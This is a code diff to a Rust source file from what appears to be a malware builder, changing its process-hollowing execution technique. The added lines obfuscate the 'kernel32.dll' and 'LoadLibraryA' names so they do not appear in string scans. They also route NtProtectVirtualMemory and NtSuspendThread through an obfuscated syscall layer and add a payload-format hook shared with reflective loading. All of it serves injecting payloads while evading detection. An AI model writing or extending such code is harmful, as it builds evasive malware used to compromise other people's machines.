@@ -6,6 +6,7 @@
 
 use serde::{Deserialize, Serialize};
 
+use crate::config::schema::PayloadFormat;
 use crate::engine::obfuscation::StringsConfig;
 
 use super::{Capability, Category, Stability, TechniqueDef};
@@ -52,6 +53,8 @@ params:
         "NtReadVirtualMemory",
         "NtResumeThread",
         "NtUnmapViewOfSection",
+        "NtProtectVirtualMemory",
+        "NtSuspendThread",
     ],
     resolves_imports: true,
 };
@@ -59,17 +62,37 @@ params:
 impl Params {
     /// Renders the process-hollowing stub fragment for these parameters.
     ///
-    /// The per-build target path is substituted into the fragment's
-    /// placeholder as code that rebuilds the string at runtime (using
-    /// `strings`'s active strategy), so it does not appear in `strings`. The
-    /// `ntdll.dll` / `NtUnmapViewOfSection` names moved to the syscall layer
-    /// (`engine::syscalls`), which obfuscates them the same way.
+    /// The per-build target path and the remote-DLL-load resolver's
+    /// `kernel32.dll` / `LoadLibraryA` names are substituted into the
+    /// fragment's placeholders as code that rebuilds them at runtime (using
+    /// `strings`'s active strategy), so none of them appears in `strings`.
+    /// The `ntdll.dll` / `NtUnmapViewOfSection` / `NtProtectVirtualMemory` /
+    /// `NtSuspendThread` names moved to the syscall layer (`engine::syscalls`),
+    /// which obfuscates them the same way.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
         let target_def = strings
             .obfuscate(&self.target)
             .render_stub_expr("hollow_target");
+        let kernel32_def = strings
+            .obfuscate("kernel32.dll")
+            .render_stub_expr("kernel32_name");
+        let load_library_def = strings
+            .obfuscate("LoadLibraryA")
+            .render_stub_expr("load_library_name");
         DEF.stub_fragment
             .replace("$HOLLOW_TARGET_DEF$", &target_def)
+            .replace("$KERNEL32_DEF$", &kernel32_def)
+            .replace("$LOAD_LIBRARY_DEF$", &load_library_def)
+    }
+
+    /// Renders the fragment for the payload's binary format.
+    ///
+    /// `process_hollowing` replaces a suspended process's image, so it only
+    /// runs a PE executable. `config::validate` rejects `format: dll`/
+    /// `shellcode` before this runs; the parameter is accepted (and ignored) to
+    /// keep the execution-technique contract uniform with `reflective_loading`.
+    pub fn render_fragment_for(&self, strings: &StringsConfig, _format: PayloadFormat) -> String {
+        self.render_fragment(strings)
     }
 }
 
